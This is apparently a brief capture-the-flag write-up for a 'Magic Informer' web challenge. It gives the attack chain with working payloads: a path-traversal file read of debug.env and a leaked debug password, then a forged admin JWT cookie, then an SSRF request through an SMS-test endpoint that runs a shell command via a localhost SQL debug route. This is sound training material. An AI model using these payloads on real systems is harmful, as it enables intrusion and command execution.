# Magic Informer
* Uploading file seems to get a hash returned:
Could use LFI:

Found debug.env

DEBUG_PASS=CzliwZJkV60hpPJ

Found source code... via LFI from `/download?resume=....//....//....//app//package.json` originally tried brute forcing the password... then looked deeped and noticed admin only required an unsigned cookie - so added that to gain access to dashboard,
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY5OTk3MTY0fQ.LuJQeLhAsrhiCRGkGFNvSBaZecWXqG6sq1OPueTKHrg
```

Looked like the sql debug endpoing could only come from localhost, luckily we had the sms-test endpoint whic could use. ended up with the following payload to `POST /api/sms/test`:

```json
{"verb":"POST","url":"http://127.0.0.1:1337/debug/sql/exec","params":"{\"sql\":\".shell ls\",\"password\":\"CzliwZJkV60hpPJ\"}","headers":"Content-Type: application/json\nCookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY5OTk3MTY0fQ.LuJQeLhAsrhiCRGkGFNvSBaZecWXqG6sq1OPueTKHrg","resp_ok":"<status>ok</status>","resp_bad":"<status>error</status>"}
```
